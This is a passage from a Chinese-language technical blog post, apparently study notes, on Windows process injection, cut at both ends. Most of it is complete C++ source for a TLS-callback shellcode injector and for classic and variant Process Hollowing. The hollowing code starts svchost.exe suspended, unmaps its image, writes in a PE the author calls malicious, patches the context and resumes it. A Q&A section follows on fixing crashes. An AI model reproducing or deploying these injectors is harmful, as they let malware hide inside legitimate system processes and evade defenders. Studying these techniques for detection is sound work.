pe.szExeFile) &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tCloseHandle(hSnapshot);</span><br><span class=\"line\">\t\t\t\t\tpid &#x3D; pe.th32ProcessID;</span><br><span class=\"line\">\t\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; while (Process32Next(hSnapshot, &amp;pe));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tHANDLE hMapping &#x3D; CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tLPVOID lpMapAddress &#x3D; MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));</span><br><span class=\"line\">\t\tmemcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));</span><br><span class=\"line\">\t\tHANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class=\"line\">\t\tLPVOID lpMapAddressRemote &#x3D; MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);</span><br><span class=\"line\">\t\tHANDLE hRemoteThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);</span><br><span class=\"line\">\t\tUnmapViewOfFile(lpMapAddress);</span><br><span class=\"line\">\t\tCloseHandle(hMapping);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:__tls_used&quot;)</span><br><span class=\"line\">#pragma comment (linker, &quot;&#x2F;INCLUDE:__tls_callback&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma data_seg (&quot;.CRT$XLB&quot;)</span><br><span class=\"line\">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback &#x3D; TlsCallBack;</span><br><span class=\"line\">#pragma data_seg ()</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Process-Hollowing\"><a href=\"#Process-Hollowing\" class=\"headerlink\" title=\"Process Hollowing*\"></a>Process Hollowing*</h1><p>进程镂空/傀儡进程  基本原理如图：类似于DLL Hollowing，掏空目标（exe进程）的内存空间，覆写PE/shellcode。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/process-hollowing.gif\" alt=\"process-hollowing\"></p>\n<p>在我学习该方法时，有许多的变体，这里列出表格概述：原始PE为要注入的合法目标，新PE为待注入的恶意软件</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>原理解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>经典Process Hollowing</td>\n<td>原始 PE 在内存中取消映射，并且新PE从相同起始地址开辟RWX空间，写入后执行</td>\n</tr>\n<tr>\n<td>经典Process Hollowing变体</td>\n<td>原始PE内存中保持原样，新PE被写入到新的RWX内存，从新地址执行</td>\n</tr>\n<tr>\n<td>Process Overwriting</td>\n<td>原始PE内存中保持映射，直接将新PE覆写，执行</td>\n</tr>\n<tr>\n<td>Process Stomping</td>\n<td>通过寻找滥用RWX权限section的PE (exe或dll) ，将shellcode写入该区域，执行</td>\n</tr>\n</tbody></table>\n<p>另外关于不同版本：</p>\n<p>当编译为32位时，仅支持x86架构</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">32 bit evil-PE -&gt; 32 bit target-PE</span><br></pre></td></tr></table></figure>\n\n<p>当编译为64位时，支持两种架构</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">64 bit evil-PE -&gt; 64 bit target-PE</span><br><span class=\"line\">32 bit evil-PE -&gt; 32 bit target-PE</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"经典Process-Hollowing\"><a href=\"#经典Process-Hollowing\" class=\"headerlink\" title=\"经典Process Hollowing\"></a>经典Process Hollowing</h2><p>经典镂空通过创建挂起的进程，将内存映射取消，并在同一位置（基址）开辟内存，将要注入的PE覆写进去，通过设置寄存器的值设置上下文，然后恢复挂起线程。</p>\n<p>流程如下：</p>\n<ul>\n<li><p>CreateProcess 创建一个挂起的合法进程</p>\n</li>\n<li><p>CreateFile 读取恶意PE</p>\n</li>\n<li><p>GetThreadContext 获取挂起进程上下文与环境信息</p>\n</li>\n<li><p>NtUnmapViewOfSection 卸载挂起进程内存</p>\n</li>\n<li><p>VirtualAllocEx 开辟空间</p>\n</li>\n<li><p>WriteProcessMemory 写入PE</p>\n</li>\n<li><p>修复重定位表</p>\n</li>\n<li><p>SetThreadContext 设置上下文</p>\n</li>\n<li><p>ResumeThread 恢复挂起进程</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct IMAGE_RELOCATION_ENTRY &#123;</span><br><span class=\"line\">\tWORD Offset : 12;</span><br><span class=\"line\">\tWORD Type : 4;</span><br><span class=\"line\">&#125; IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 要确保SourceFile和TargetFile的Subsystem相同，否则注入失败</span><br><span class=\"line\">const LPCSTR SourceFile &#x3D; &quot;C:\\\\Users\\\\cys\\\\Desktop\\\\shellcode.exe&quot;;  &#x2F;&#x2F; 待注入PE</span><br><span class=\"line\">const LPCSTR TargetFile &#x3D; &quot;C:\\\\windows\\\\System32\\\\svchost.exe&quot;;  &#x2F;&#x2F; 目标PE</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Process-Hollowing</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F;创建挂起进程</span><br><span class=\"line\">\tSTARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\tsi.cb &#x3D; sizeof(STARTUPINFOA);</span><br><span class=\"line\">\tPROCESS_INFORMATION pi;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCreateProcessA(</span><br><span class=\"line\">\t\tTargetFile,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tFALSE,</span><br><span class=\"line\">\t\tCREATE_SUSPENDED,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t&amp;si,</span><br><span class=\"line\">\t\t&amp;pi</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!pi.hProcess) &#123; cerr &lt;&lt; &quot;[-]Creat process fail&quot;; return 1; &#125;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]Process PID: &quot; &lt;&lt; pi.dwProcessId &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hfile &#x3D; CreateFile(SourceFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class=\"line\">\tDWORD dwFileSize &#x3D; GetFileSize(hfile, NULL);</span><br><span class=\"line\">\tPVOID lpBuffer &#x3D; VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD dwReadSize &#x3D; 0;</span><br><span class=\"line\">\tReadFile(hfile, lpBuffer, dwFileSize, &amp;dwReadSize, NULL);</span><br><span class=\"line\">\tCloseHandle(hfile);</span><br><span class=\"line\"></span><br><span class=\"line\">\tCONTEXT ctx;</span><br><span class=\"line\">\tctx.ContextFlags &#x3D; CONTEXT_FULL;</span><br><span class=\"line\">\tGetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">\tPVOID RemoteImageBase;</span><br><span class=\"line\">\tBOOL readpeb &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取被挂起进程基址技巧：通过寄存器https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-253432-1.htm</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\t&#x2F;&#x2F; 从rdx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\t&#x2F;&#x2F; 从ebx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\tif (!readpeb) &#123;</span><br><span class=\"line\">\t\tDWORD error &#x3D; GetLastError();</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[-]ReadProcessMemory failed with error code: &quot; &lt;&lt; error &lt;&lt; endl;</span><br><span class=\"line\">\t\treturn 1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t&#x2F;&#x2F; unmap卸载内存</span><br><span class=\"line\">\tpNtUnmapViewOfSection NtUnmapViewOfSection &#x3D; (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;);</span><br><span class=\"line\">\tNTSTATUS result &#x3D; NtUnmapViewOfSection(pi.hProcess, RemoteImageBase);</span><br><span class=\"line\">\tif (result) &#123; cout &lt;&lt; &quot;[-]NtUnmapViewOfSection fail&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tconst auto pDos &#x3D; (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class=\"line\">\tconst auto pNt &#x3D; (PIMAGE_NT_HEADERS)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;对挂起进程开辟空间</span><br><span class=\"line\">\tLPVOID pRemoteMem &#x3D; VirtualAllocEx(pi.hProcess, RemoteImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[*]VirtualAllocEx: 0x&quot; &lt;&lt; pRemoteMem &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tconst DWORD64 DeltaImageBase &#x3D; (DWORD64)pRemoteMem - pNt-&gt;OptionalHeader.ImageBase;</span><br><span class=\"line\">\tpNt-&gt;OptionalHeader.ImageBase &#x3D; (DWORD64)pRemoteMem;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入文件头，包括 DOS&#x2F;NT&#x2F;SECTION headers</span><br><span class=\"line\">\t&#x2F;&#x2F;从 pi.hProcess 中的 pRemoteMem 地址开始写 lpBuffer 内容的 pNt-&gt;OptionalHeader.SizeOfHeaders 大小字节</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, pRemoteMem, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\tconst IMAGE_DATA_DIRECTORY ImageDataReloc &#x3D; pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER lpImageRelocSection &#x3D; nullptr;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入section节区</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tconst auto lpImageSectionHeader &#x3D; (PIMAGE_SECTION_HEADER)((uintptr_t)pNt + 4 + sizeof(IMAGE_FILE_HEADER) + pNt-&gt;FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));</span><br><span class=\"line\">\t\t&#x2F;&#x2F; 定位reloc</span><br><span class=\"line\">\t\tif (ImageDataReloc.VirtualAddress &gt;&#x3D; lpImageSectionHeader-&gt;VirtualAddress &amp;&amp; ImageDataReloc.VirtualAddress &lt; (lpImageSectionHeader-&gt;VirtualAddress + lpImageSectionHeader-&gt;Misc.VirtualSize))</span><br><span class=\"line\">\t\t\tlpImageRelocSection &#x3D; lpImageSectionHeader;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tPVOID pSectionDestination &#x3D; (PVOID)((LPBYTE)pRemoteMem + lpImageSectionHeader-&gt;VirtualAddress);</span><br><span class=\"line\">\t\tWriteProcessMemory(pi.hProcess, pSectionDestination, (LPVOID)((uintptr_t)lpBuffer + lpImageSectionHeader-&gt;PointerToRawData), lpImageSectionHeader-&gt;SizeOfRawData, nullptr);</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[*]Writing &quot; &lt;&lt; lpImageSectionHeader-&gt;Name &lt;&lt; &quot; section to 0x&quot; &lt;&lt; hex &lt;&lt; pSectionDestination &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+] Relocation section :&quot; &lt;&lt; lpImageRelocSection-&gt;Name &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;修复重定位</span><br><span class=\"line\">\tDWORD RelocOffset &#x3D; 0;</span><br><span class=\"line\">\twhile (RelocOffset &lt; ImageDataReloc.Size)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tconst auto lpImageBaseRelocation &#x3D; (PIMAGE_BASE_RELOCATION)((DWORD64)lpBuffer + lpImageRelocSection-&gt;PointerToRawData + RelocOffset);</span><br><span class=\"line\">\t\tRelocOffset +&#x3D; sizeof(IMAGE_BASE_RELOCATION);</span><br><span class=\"line\">\t\tconst DWORD NumberOfEntries &#x3D; (lpImageBaseRelocation-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) &#x2F; sizeof(IMAGE_RELOCATION_ENTRY);</span><br><span class=\"line\">\t\tfor (DWORD i &#x3D; 0; i &lt; NumberOfEntries; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tconst auto lpImageRelocationEntry &#x3D; (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpBuffer + lpImageRelocSection-&gt;PointerToRawData + RelocOffset);</span><br><span class=\"line\">\t\t\tRelocOffset +&#x3D; sizeof(IMAGE_RELOCATION_ENTRY);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tif (lpImageRelocationEntry-&gt;Type &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t\t\tcontinue;</span><br><span class=\"line\">\t\t\tconst DWORD64 AddressLocation &#x3D; (DWORD64)pRemoteMem + lpImageBaseRelocation-&gt;VirtualAddress + lpImageRelocationEntry-&gt;Offset;</span><br><span class=\"line\">\t\t\tDWORD64 PatchedAddress &#x3D; 0;</span><br><span class=\"line\">\t\t\tReadProcessMemory(pi.hProcess, (LPVOID)AddressLocation, &amp;PatchedAddress, sizeof(DWORD64), nullptr);</span><br><span class=\"line\">\t\t\tPatchedAddress +&#x3D; DeltaImageBase;</span><br><span class=\"line\">\t\t\tWriteProcessMemory(pi.hProcess, (LPVOID)AddressLocation, &amp;PatchedAddress, sizeof(DWORD64), nullptr);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+] Relocations done&quot; &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;57341183&#x2F;view-address-of-entry-point-in-eax-register-for-a-suspended-process-in-windbg</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\t&#x2F;&#x2F;将rcx寄存器设置为注入软件的入口点</span><br><span class=\"line\">\tctx.Rcx &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\t&#x2F;&#x2F;将eax寄存器设置为注入软件的入口点</span><br><span class=\"line\">\tctx.Eax &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F;释放本内存中PE痕迹</span><br><span class=\"line\">\tVirtualFree(lpBuffer, 0, MEM_RELEASE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]SetThreadContext&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tSetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">\tResumeThread(pi.hThread);</span><br><span class=\"line\">\tCloseHandle(pi.hThread);</span><br><span class=\"line\">\tCloseHandle(pi.hProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>unmap前：Image类型内存</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721573785580.png\" alt=\"QQ_1721573785580\"></p>\n<p>unmap后：取消映射</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721573824084.png\" alt=\"QQ_1721573824084\"></p>\n<p>同一地址再开辟：变为Private类型</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721573892710.png\" alt=\"QQ_1721573892710\"></p>\n<p>恢复线程：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ_1723687845227.png\" alt=\"QQ_1723687845227\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ_1723688440624.png\" alt=\"QQ_1723688440624\"></p>\n<p><strong>过程中一些问题：</strong></p>\n<p>Q：为什么修复重定位表？</p>\n<p>A：加载基址与imagebase不一样。</p>\n<p>Q：程序没有reloc怎么办？</p>\n<p>A：使用变体即可，否则使用经典会报错</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ_1723688682452.png\" alt=\"QQ_1723688682452\"></p>\n<p>Q：为什么在x64镂空svchost.exe会失败？</p>\n<p>A：看到某项目中一句话，具体原因还没调试。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">In Process Hollowing Injection technique, it Crashes With Some 64bit process like System32\\svchost.exe,... </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721575525006.png\" alt=\"QQ_1721575525006\"></p>\n<p>后来发现和 编译选项 <code>/Subsystem</code> 有关，右图为svchost.exe，它的Subsystem为GUI APP，而我编译要注入的程序为Console App，所以导致无法正常执行。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722873859246.png\" alt=\"QQ_1722873859246\"></p>\n<p>解决方法为：将编译选项更换与svchost.exe相同</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722873994874.png\" alt=\"QQ_1722873994874\"></p>\n<p>同时将注入的PE修改函数为WinMain</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MessageBoxA(0, &quot;Process Hollowing&quot;, &quot;Process Hollowing&quot;, 0);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>正常运行！</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722874104137.png\" alt=\"QQ_1722874104137\"></p>\n<p>Q：这一行代码作用?：<code>    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</code></p>\n<p>A：恢复PEB基址</p>\n<p>参考：</p>\n<p><a href=\"https://github.com/m0n0ph1/Process-Hollowing\">https://github.com/m0n0ph1/Process-Hollowing</a>   原始x86</p>\n<p><a href=\"https://github.com/comosedice2012/Introduction-to-Process-Hollowing\">https://github.com/comosedice2012/Introduction-to-Process-Hollowing</a>  没有重定位</p>\n<h2 id=\"Process-Hollowing-变体\"><a href=\"#Process-Hollowing-变体\" class=\"headerlink\" title=\"Process Hollowing 变体\"></a>Process Hollowing 变体</h2><p>该变体，是网上文章中最常见的代码。不使用NtUnmapViewOfSection卸载原映射内存，通过要注入PE的OptionalHeader的ImageBase，直接在挂起进程中的该地址开辟新空间、写入PE，这样就省区了修复重定位表的操作。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">对于exe，32位默认基地址(imagebase)是0x400000，64位是0x1400000</span><br><span class=\"line\">对于DLL，32位默认基地址(imagebase)是0x10000000，64位是0x1800000</span><br></pre></td></tr></table></figure>\n\n<p>流程如下：</p>\n<ul>\n<li>CreateProcess 创建一个挂起的合法进程</li>\n<li>CreateFile 读取恶意PE</li>\n<li>GetThreadContext 获取挂起进程上下文与环境信息</li>\n<li>VirtualAllocEx 开辟空间</li>\n<li>WriteProcessMemory 写入PE</li>\n<li>SetThreadContext 设置上下文</li>\n<li>ResumeThread 恢复挂起进程</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 要确保SourceFile和TargetFile的Subsystem相同以及 位数相同，否则注入失败</span><br><span class=\"line\">const LPCSTR SourceFile &#x3D; &quot;C:\\\\Users\\\\cys\\\\Desktop\\\\box64.exe&quot;;  &#x2F;&#x2F; 待注入PE</span><br><span class=\"line\">const LPCSTR TargetFile &#x3D; &quot;C:\\\\windows\\\\System32\\\\svchost.exe&quot;;  &#x2F;&#x2F; 目标PE</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Process-Hollowing 变体</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F;创建挂起进程</span><br><span class=\"line\">\tSTARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\tsi.cb &#x3D; sizeof(STARTUPINFOA);</span><br><span class=\"line\">\tPROCESS_INFORMATION pi;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCreateProcessA(</span><br><span class=\"line\">\t\tTargetFile,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tFALSE,</span><br><span class=\"line\">\t\tCREATE_SUSPENDED,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t&amp;si,</span><br><span class=\"line\">\t\t&amp;pi</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!pi.hProcess) &#123; cerr &lt;&lt; &quot;[-]Creat process fail&quot;; return 1; &#125;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]Process PID: &quot; &lt;&lt; pi.dwProcessId &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hfile &#x3D; CreateFile(SourceFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class=\"line\">\tDWORD dwFileSize &#x3D; GetFileSize(hfile, NULL);</span><br><span class=\"line\">\tPVOID lpBuffer &#x3D; VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD dwReadSize &#x3D; 0;</span><br><span class=\"line\">\tReadFile(hfile, lpBuffer, dwFileSize, &amp;dwReadSize, NULL);</span><br><span class=\"line\">\tCloseHandle(hfile);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取挂起进程的线程上下文和映像基址</span><br><span class=\"line\">\tCONTEXT ctx;</span><br><span class=\"line\">\tctx.ContextFlags &#x3D; CONTEXT_FULL;</span><br><span class=\"line\">\tGetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">\tPVOID RemoteImageBase;</span><br><span class=\"line\">\tBOOL readpeb &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取被挂起进程基址技巧：通过寄存器https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-253432-1.htm</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\t&#x2F;&#x2F; 从rdx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\t&#x2F;&#x2F; 从ebx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\tif (!readpeb) &#123;</span><br><span class=\"line\">\t\tDWORD error &#x3D; GetLastError();</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[-]ReadProcessMemory failed with error code: &quot; &lt;&lt; error &lt;&lt; endl;</span><br><span class=\"line\">\t\treturn 1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (LPBYTE)lpBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 对挂起进程开辟空间</span><br><span class=\"line\">\tPVOID pRemoteMem &#x3D; VirtualAllocEx(pi.hProcess, (LPVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[*]VirtualAllocEx: &quot; &lt;&lt; pRemoteMem &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入文件头，包括 DOS&#x2F;NT&#x2F;SECTION headers</span><br><span class=\"line\">\t&#x2F;&#x2F; 从 pi.hProcess 中的 pRemoteMem 地址开始写 lpBuffer 内容的 pNt-&gt;OptionalHeader.SizeOfHeaders 大小字节</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, pRemoteMem, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入section节区</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tauto pSectionHeaders &#x3D; (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));</span><br><span class=\"line\">\t\t&#x2F;&#x2F; section data为空</span><br><span class=\"line\">\t\tif 